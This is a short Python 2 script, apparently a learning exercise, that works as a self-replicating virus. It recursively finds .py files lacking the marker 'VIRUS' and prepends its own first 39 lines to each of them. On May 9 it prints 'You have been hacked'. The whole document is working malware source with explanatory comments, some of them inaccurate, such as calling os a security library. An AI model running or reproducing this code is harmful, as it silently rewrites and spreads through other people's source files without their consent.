# Start interpreter
#!/usr/bin/python
import os # This line imports the security library utility modules 
import datetime # This lines imports the date and time

SIGNATURE = "VIRUS" # The lines is the initial creation of the variable

def locate(path): # This line is defining the function to locate all the parameters within the ()
    files_targeted = [] # This line will access the target files lists within the brackets array
    filelist = os.listdir(path) # This line will return the list containing the names in the directory given by the path
    for fname in filelist: # 
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i&gt;=0 and i &lt;39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
